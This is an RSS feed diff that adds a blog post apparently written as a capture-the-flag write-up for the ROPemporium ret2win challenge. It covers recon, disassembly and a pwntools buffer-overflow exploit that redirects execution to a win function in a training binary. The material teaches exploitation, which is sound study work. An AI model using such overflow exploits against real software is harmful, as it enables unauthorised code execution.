@@ -4,7 +4,383 @@
 <title><![CDATA[C3lphie blogs]]></title>
 <description><![CDATA[C3lphie blogs]]></description>
 <link>https://c3lphie.com</link>
-<lastBuildDate>Thu, 11 Mar 2021 16:30:50 +0100</lastBuildDate>
+<lastBuildDate>Tue, 23 Mar 2021 21:01:04 +0100</lastBuildDate>
+<item>
+  <title><![CDATA[ROPemporium | ret2win]]></title>
+  <description><![CDATA[
+<nav id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#org8460fd1">1. Introduction</a>
+<ul>
+<li><a href="#org1c6d171">1.1. Buffer overflows</a></li>
+<li><a href="#org2e5411f">1.2. Return Oriented Programming</a></li>
+</ul>
+</li>
+<li><a href="#org4db6836">2. Recon</a>
+<ul>
+<li><a href="#orgc85421b">2.1. File</a></li>
+<li><a href="#org57e8390">2.2. Checksec</a></li>
+<li><a href="#orgf9cc45b">2.3. Binary ninja</a>
+<ul>
+<li><a href="#orgd40d656">2.3.1. Main function</a></li>
+<li><a href="#org3da2103">2.3.2. pwnme function</a></li>
+<li><a href="#orgdd84b90">2.3.3. ret2win function</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#org5f9bde2">3. Exploit</a>
+<ul>
+<li><a href="#orgf82c157">3.1. Useful addresses</a></li>
+<li><a href="#org3b7cee0">3.2. Code</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</nav>
+
+<div id="outline-container-org8460fd1" class="outline-2">
+<h2 id="org8460fd1"><span class="section-number-2">1</span> Introduction</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+Welcome to this little write-up on the very first challenge from ROPemporium.
+</p>
+
+<p>
+ROPemporium is a platform for learning the mystic art of return-oriented programming(ROP).
+This is accomplished by going through 8 challenges in total, with increasing diffyculty.
+</p>
+
+<p>
+But before we begin this little eight-part adventure, let's take a closer look at what ROP is for a thing.
+</p>
+</div>
+
+<div id="outline-container-org1c6d171" class="outline-3">
+<h3 id="org1c6d171"><span class="section-number-3">1.1</span> Buffer overflows</h3>
+<div class="outline-text-3" id="text-1-1">
+<p>
+I know that I just said i would explain ROP, but before we get into that.
+Let us quickly brushup on what a buffer overflow is.
+</p>
+
+<p>
+According to the very first paragraph on <a href="https://en.wikipedia.org/wiki/Buffer_overflow">wikipedia</a>:
+</p>
+<blockquote>
+<p>
+In information security and programming, a buffer overflow, or buffer overrun, is an anomaly where a program, while writing data to a buffer, overruns the buffer's boundary and overwrites adjacent memory locations.
+</p>
+</blockquote>
+
+<p>
+So buffer overflows happens when it is possible to put more data into a variable thereby overwriting other memory adresses.
+</p>
+
+<p>
+But why is this dangerous??
+</p>
+
+<p>
+Because we can manipulate the content in the different registers.
+And through this execute abitriary code.
+</p>
+
+<p>
+Again this was a veeeery short overview, if you want to read more about buffer overflows, and I recommend that you do, here is a list of resources on the subject:
+</p>
+<dl class="org-dl">
+<dt><a href="https://blog.rapid7.com/2019/02/19/stack-based-buffer-overflow-attacks-what-you-need-to-know/">Rapid7 - Stack-Based</a></dt><dd>Explained with Examples</dd>
+<dt><a href="https://0xrick.github.io/">0xrick</a></dt><dd>Look at his basic binary series</dd>
+<dt><a href="https://github.com/Tzaoh/pwning">Tzaoh's pwning list</a></dt><dd>Huge list of resources on all kinds of exploitation</dd>
+</dl>
+
+<p>
+Eventually I'll create a series focused just on buffer overflows, but for now you'll have to make do.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org2e5411f" class="outline-3">
+<h3 id="org2e5411f"><span class="section-number-3">1.2</span> Return Oriented Programming</h3>
+<div class="outline-text-3" id="text-1-2">
+<p>
+Again we look towards Wikipedia for more knowledge.
+The first paragraph on <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">Wikipedia</a>:
+</p>
+<blockquote>
+<p>
+Return-oriented programming (ROP) is a computer security exploit technique that allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing.
+</p>
+</blockquote>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org4db6836" class="outline-2">
+<h2 id="org4db6836"><span class="section-number-2">2</span> Recon</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+Before anything is done you should always to some reconnaissance on your target.
+The more you know about the target, the easier it will be to model an attack towards it.
+</p>
+</div>
+<div id="outline-container-orgc85421b" class="outline-3">
+<h3 id="orgc85421b"><span class="section-number-3">2.1</span> File</h3>
+<div class="outline-text-3" id="text-2-1">
+<p>
+The first thing you should do with any compiled binary that you want to pwn(professionel language for defeating security), is to run the <code>file</code> command on the the binary.
+</p>
+<pre class="example" id="org9565950">
+┌────[~/ha/bi/ropemporium/ret2win on  master [?]
+└─&gt;file ret2win
+ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
+</pre>
+<p>
+What this tells us is that the binary <code>ret2win</code> is a 64-bit ELF file.
+</p>
+
+<p>
+It is not stripped, which means that if there is any debugging information in the code, we should be able to see it.
+It also means symbols are left in so we can see function names.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org57e8390" class="outline-3">
+<h3 id="org57e8390"><span class="section-number-3">2.2</span> Checksec</h3>
+<div class="outline-text-3" id="text-2-2">
+<p>
+After looking at what <code>file</code> gives outputs, the next nifty tool we should use is: <code>checksec</code>.
+It is a part of <code>pwntools</code>, <a href="https://github.com/Gallopsled/pwntools">a CTF framework and exploit development library</a>, and can tell us about what kind of security measures that the binary is compiled with.
+</p>
+<pre class="example" id="org4ab42c7">
+┌────[~/ha/bi/ropemporium/ret2win on  master [?]
+└─&gt;checksec ret2win
+[*] '/home/c3lphie/hacking/binary_exploitation/ropemporium/ret2win/ret2win'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</pre>
+<p>
+Here we see that there is basically no security measures put in place&#x2026; Which one would expect on the very first challenge.
+But what is it that we see here?
+</p>
+
+<dl class="org-dl">
+<dt>Arch</dt><dd>This is the Architecture for which the binary was compiled for. In this case we see that it is <code>amd64-64-little</code> I'll break this down further in a minute.</dd>
+<dt>RELRO</dt><dd>A security measure which makes some binary sections read-only. Partial RELRO means basically nothing for us. Full RELRO is a lot more secure, but I'll tackle this when I encounter it.</dd>
+<dt>Stack</dt><dd>This tells us if there are any canaries compiled into the binary. Canaries are a security measure that protect from stack smashing attacks&#x2026; Like what we're doing here. Not that they can't be handled</dd>
+<dt>NX</dt><dd>A technology which splits the areas of memory up so that data can't be executed. This is the security measure we bypass using ROP</dd>
+<dt>PIE</dt><dd>If this was enabled, the binary would have been loaded randomly into memory making it harder to exploit. But this is not something we need to worry about.</dd>
+</dl>
+
+<p>
+The architecture this binary was compiled for was <code>amd64-64-little</code>, let's split this up into two.
+<code>amd64-64</code> means that it's for a 64 bit system.
+<code>-little</code> tells us that is for a little endian system.
+Which you can read more about <a href="https://www.section.io/engineering-education/what-is-little-endian-and-big-endian/">here</a>.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgf9cc45b" class="outline-3">
+<h3 id="orgf9cc45b"><span class="section-number-3">2.3</span> Binary ninja</h3>
+<div class="outline-text-3" id="text-2-3">
+<p>
+Now there are probably a ton of other tools that you could use to find other things about the binary.
+But at this point I know enough about the target for now.
+</p>
+
+<p>
+I have chosen <a href="https://binary.ninja/">Binary ninja</a> for reverse engineering software.
+But use what-ever you're most comfortable in, and if you don't have the economy to buy a piece of software, then there are opensource software available like <a href="https://cutter.re/">cutter</a> or <a href="https://ghidra-sre.org/">ghidra</a>(if you're not afraid of the NSA ;)).
+</p>
+</div>
+<div id="outline-container-orgd40d656" class="outline-4">
+<h4 id="orgd40d656"><span class="section-number-4">2.3.1</span> Main function</h4>
+<div class="outline-text-4" id="text-2-3-1">
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>main function disassembled</label><pre class="src src-asm"><span style="color: #de935f;">push</span>    <span style="color: #b5bd68;">rbp</span> <span style="color: #c5c8c6;">{</span>__saved_rbp<span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">rbp</span>, rsp <span style="color: #c5c8c6;">{</span>__saved_rbp<span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">rax</span>, qword <span style="color: #c5c8c6;">[</span>rel stdout<span style="color: #c5c8c6;">]</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">ecx</span>, 0x0
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edx</span>, 0x2
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">esi</span>, 0x0
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">rdi</span>, rax
+<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">setvbuf</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x400808  <span style="color: #c5c8c6;">{</span><span style="color: #8abeb7;">"ret2win by ROP Emporium"</span><span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">puts</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x400820  <span style="color: #c5c8c6;">{</span><span style="color: #8abeb7;">"x86_64\n"</span><span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">puts</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">eax</span>, 0x0
+<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">pwnme</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x400828  <span style="color: #c5c8c6;">{</span><span style="color: #8abeb7;">"\nExiting"</span><span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">puts</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">eax</span>, 0x0
+<span style="color: #de935f;">pop</span>     <span style="color: #b5bd68;">rbp</span> <span style="color: #c5c8c6;">{</span>__saved_rbp<span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">retn</span>     <span style="color: #c5c8c6;">{</span>__return_addr<span style="color: #c5c8c6;">}</span>
+</pre>
+</div>
+<p>
+Here we see the main function disassembled, there isn't anything interesting to see.
+What we want is the function pwnme, which is called on line 14.
+So let's take a look at that instead shall we?
+</p>
+</div>
+</div>
+<div id="outline-container-org3da2103" class="outline-4">
+<h4 id="org3da2103"><span class="section-number-4">2.3.2</span> pwnme function</h4>
+<div class="outline-text-4" id="text-2-3-2">
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 2: </span>pwnme function disassembled</label><pre class="src src-asm"><span style="color: #de935f;">push</span>    <span style="color: #b5bd68;">rbp</span> <span style="color: #c5c8c6;">{</span>__saved_rbp<span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">rbp</span>, rsp <span style="color: #c5c8c6;">{</span>__saved_rbp<span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">sub</span>     <span style="color: #b5bd68;">rsp</span>, 0x20
+<span style="color: #de935f;">lea</span>     <span style="color: #b5bd68;">rax</span>, <span style="color: #c5c8c6;">[</span>rbp-0x20 <span style="color: #8abeb7;">{</span>var_28<span style="color: #8abeb7;">}</span><span style="color: #c5c8c6;">]</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edx</span>, 0x20
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">esi</span>, 0x0
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">rdi</span>, rax <span style="color: #c5c8c6;">{</span>var_28<span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">memset</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x400838  <span style="color: #c5c8c6;">{</span><span style="color: #8abeb7;">"For my first trick, I will attem&#8230;"</span><span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">puts</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x400898  <span style="color: #c5c8c6;">{</span><span style="color: #8abeb7;">"What could possibly go wrong?"</span><span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">puts</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x4008b8  <span style="color: #c5c8c6;">{</span><span style="color: #8abeb7;">"You there, may I have your input&#8230;"</span><span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">puts</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x400918
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">eax</span>, 0x0
+<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">printf</span>
+<span style="color: #de935f;">lea</span>     <span style="color: #b5bd68;">rax</span>, <span style="color: #c5c8c6;">[</span>rbp-0x20 <span style="color: #8abeb7;">{</span>var_28<span style="color: #8abeb7;">}</span><span style="color: #c5c8c6;">]</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edx</span>, 0x38
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">rsi</span>, rax <span style="color: #c5c8c6;">{</span>var_28<span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x0
+<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">read</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x40091b  <span style="color: #c5c8c6;">{</span><span style="color: #8abeb7;">"Thank you!"</span><span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">puts</span>
+<span style="color: #de935f;">nop</span>     
+<span style="color: #de935f;">leave</span>    <span style="color: #c5c8c6;">{</span>__saved_rbp<span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">retn</span>     <span style="color: #c5c8c6;">{</span>__return_addr<span style="color: #c5c8c6;">}</span>
+</pre>
+</div>
+<p>
+Since this is the function, which should be pwned, lets take a closer look using binary ninjas HLIL
+</p>
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 3: </span>pwnme function HLIL</label><pre class="src src-c"><span style="color: #81a2be;">void</span> <span style="color: #de935f;">var_28</span>
+memset<span style="color: #c5c8c6;">(</span>&amp;var_28, 0, 0x20<span style="color: #c5c8c6;">)</span>
+<span style="color: #de935f;">puts</span><span style="color: #c5c8c6;">(</span>str: <span style="color: #8abeb7;">"For my first trick, I will attem&#8230;"</span><span style="color: #c5c8c6;">)</span>
+<span style="color: #de935f;">puts</span><span style="color: #c5c8c6;">(</span>str: <span style="color: #8abeb7;">"What could possibly go wrong?"</span><span style="color: #c5c8c6;">)</span>
+<span style="color: #de935f;">puts</span><span style="color: #c5c8c6;">(</span>str: <span style="color: #8abeb7;">"You there, may I have your input&#8230;"</span><span style="color: #c5c8c6;">)</span>
+<span style="color: #de935f;">printf</span><span style="color: #c5c8c6;">(</span>format: data_400918<span style="color: #c5c8c6;">)</span>
+<span style="color: #de935f;">read</span><span style="color: #c5c8c6;">(</span>fd: 0, buf: &amp;var_28, nbytes: 0x38<span style="color: #c5c8c6;">)</span>
+<span style="color: #b5bd68;">return</span> puts<span style="color: #c5c8c6;">(</span>str: <span style="color: #8abeb7;">"Thank you!"</span><span style="color: #c5c8c6;">)</span>
+</pre>
+</div>
+<p>
+Let's clean it up a bit for easier understanding:
+</p>
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 4: </span>pwnme function HLIL with var names</label><pre class="src src-c"><span style="color: #81a2be;">void</span> <span style="color: #de935f;">buffer</span>
+memset<span style="color: #c5c8c6;">(</span>&amp;buffer, 0, 32<span style="color: #c5c8c6;">)</span>
+<span style="color: #de935f;">puts</span><span style="color: #c5c8c6;">(</span>str: <span style="color: #8abeb7;">"For my first trick, I will attem&#8230;"</span><span style="color: #c5c8c6;">)</span>
+<span style="color: #de935f;">puts</span><span style="color: #c5c8c6;">(</span>str: <span style="color: #8abeb7;">"What could possibly go wrong?"</span><span style="color: #c5c8c6;">)</span>
+<span style="color: #de935f;">puts</span><span style="color: #c5c8c6;">(</span>str: <span style="color: #8abeb7;">"You there, may I have your input&#8230;"</span><span style="color: #c5c8c6;">)</span>
+<span style="color: #de935f;">printf</span><span style="color: #c5c8c6;">(</span>format: data_400918<span style="color: #c5c8c6;">)</span>
+<span style="color: #de935f;">read</span><span style="color: #c5c8c6;">(</span>fd: 0, buf: &amp;buffer, nbytes: 56<span style="color: #c5c8c6;">)</span>
+<span style="color: #b5bd68;">return</span> puts<span style="color: #c5c8c6;">(</span>str: <span style="color: #8abeb7;">"Thank you!"</span><span style="color: #c5c8c6;">)</span>
+</pre>
+</div>
+
+<p>
+As we can see we have a buffer with the size 32 bytes, but the read call accepts up to 56 bytes.
+This means that we can overflow the buffer and control the stack.
+</p>
+</div>
+</div>
+
+
+<div id="outline-container-orgdd84b90" class="outline-4">
+<h4 id="orgdd84b90"><span class="section-number-4">2.3.3</span> ret2win function</h4>
+<div class="outline-text-4" id="text-2-3-3">
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 5: </span>ret2win function disassembled</label><pre class="src src-asm"><span style="color: #de935f;">push</span>    <span style="color: #b5bd68;">rbp</span> <span style="color: #c5c8c6;">{</span>__saved_rbp<span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">rbp</span>, rsp <span style="color: #c5c8c6;">{</span>__saved_rbp<span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x400926  <span style="color: #c5c8c6;">{</span><span style="color: #8abeb7;">"Well done! Here's your flag:"</span><span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">puts</span>
+<span style="color: #de935f;">mov</span>     <span style="color: #b5bd68;">edi</span>, 0x400943  <span style="color: #c5c8c6;">{</span><span style="color: #8abeb7;">"/bin/cat flag.txt"</span><span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">call</span>    <span style="color: #b5bd68;">system</span>
+<span style="color: #de935f;">nop</span>     
+<span style="color: #de935f;">pop</span>     <span style="color: #b5bd68;">rbp</span> <span style="color: #c5c8c6;">{</span>__saved_rbp<span style="color: #c5c8c6;">}</span>
+<span style="color: #de935f;">retn</span>     <span style="color: #c5c8c6;">{</span>__return_addr<span style="color: #c5c8c6;">}</span>
+</pre>
+</div>
+<p>
+This is the function we must aim the ret instruction towards in the pwnme function
+</p>
+
+<p>
+And as we can see it just executes <code>/bin/cat flag.txt</code> on the system.
+</p>
+</div>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org5f9bde2" class="outline-2">
+<h2 id="org5f9bde2"><span class="section-number-2">3</span> Exploit</h2>
+<div class="outline-text-2" id="text-3">
+<p>
+No PIE which means we can just grab the addresses from binary ninja
+</p>
+</div>
+<div id="outline-container-orgf82c157" class="outline-3">
+<h3 id="orgf82c157"><span class="section-number-3">3.1</span> Useful addresses</h3>
+<div class="outline-text-3" id="text-3-1">
+<p>
+ret2win: 0x400756
+</p>
+</div>
+</div>
+<div id="outline-container-org3b7cee0" class="outline-3">
+<h3 id="org3b7cee0"><span class="section-number-3">3.2</span> Code</h3>
+<div class="outline-text-3" id="text-3-2">
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #b5bd68;">from</span> pwn <span style="color: #b5bd68;">import</span> *
+
+context.update<span style="color: #c5c8c6;">(</span>arch=<span style="color: #8abeb7;">"amd64"</span>, os=<span style="color: #8abeb7;">"linux"</span><span style="color: #c5c8c6;">)</span>
+<span style="color: #f0c674;">proc</span> = process<span style="color: #c5c8c6;">(</span><span style="color: #8abeb7;">"./ret2win"</span><span style="color: #c5c8c6;">)</span>
+
+<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">send_recv</span><span style="color: #c5c8c6;">(</span><span style="color: #b294bb;">buffer</span>: <span style="color: #b294bb;">bytes</span><span style="color: #c5c8c6;">)</span>:
+    proc.recvuntil<span style="color: #c5c8c6;">(</span>b<span style="color: #8abeb7;">"&gt;"</span><span style="color: #c5c8c6;">)</span>
+    proc.sendline<span style="color: #c5c8c6;">(</span><span style="color: #b294bb;">buffer</span><span style="color: #c5c8c6;">)</span>
+    <span style="color: #b5bd68;">return</span> proc.recvline<span style="color: #c5c8c6;">()</span>
+
+
+<span style="color: #f0c674;">ret2win_addr</span> = 0x400756
+
+
+<span style="color: #f0c674;">payload</span> = cyclic<span style="color: #c5c8c6;">(</span>cyclic_find<span style="color: #8abeb7;">(</span>0x6161616B<span style="color: #8abeb7;">)</span><span style="color: #c5c8c6;">)</span>
+<span style="color: #f0c674;">payload</span> += p64<span style="color: #c5c8c6;">(</span>ret2win_addr<span style="color: #c5c8c6;">)</span>
+
+send_recv<span style="color: #c5c8c6;">(</span>payload<span style="color: #c5c8c6;">)</span>
+proc.interactive<span style="color: #c5c8c6;">()</span>
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div class="taglist"><a href="https://c3lphie.com/tags.html">Tags</a>: <a href="https://c3lphie.com/tag-ropemporium.html">ROPemporium</a> <a href="https://c3lphie.com/tag-overflow.html">overflow</a> <a href="https://c3lphie.com/tag-write-up.html">write-up</a> <a href="https://c3lphie.com/tag-exploitation.html">exploitation</a> ]]></description>
+  <category><![CDATA[ROPemporium]]></category>
+  <category><![CDATA[overflow]]></category>
+  <category><![CDATA[write-up]]></category>
+  <category><![CDATA[exploitation]]></category>
+  <link>https://c3lphie.com/2021-03-22-ropemporium-ret2win.html</link>
+  <pubDate>Mon, 22 Mar 2021 11:55:00 +0100</pubDate>
+</item>
 <item>
   <title><![CDATA[Hello world]]></title>
   <description><![CDATA[
@@ -12,13 +388,13 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents">
 <ul>
-<li><a href="#org4589719">1. Whoami</a></li>
-<li><a href="#orga5158f2">2. WTF is this</a></li>
+<li><a href="#orgf40b4b4">1. Whoami</a></li>
+<li><a href="#org353216b">2. WTF is this</a></li>
 </ul>
 </div>
 </nav>
-<div id="outline-container-org4589719" class="outline-2">
-<h2 id="org4589719"><span class="section-number-2">1</span> Whoami</h2>
+<div id="outline-container-orgf40b4b4" class="outline-2">
+<h2 id="orgf40b4b4"><span class="section-number-2">1</span> Whoami</h2>
 <div class="outline-text-2" id="text-1">
 <p>
 I'm a 21, soon to be 22, year old danish tech nerd that loves hacking, programming and all things tech!
@@ -28,8 +404,8 @@ I don't plan being too personal on this blog, so enough about who I am.
 </p>
 </div>
 </div>
-<div id="outline-container-orga5158f2" class="outline-2">
-<h2 id="orga5158f2"><span class="section-number-2">2</span> WTF is this</h2>
+<div id="outline-container-org353216b" class="outline-2">
+<h2 id="org353216b"><span class="section-number-2">2</span> WTF is this</h2>
 <div class="outline-text-2" id="text-2">
 <p>
 That is a great question!
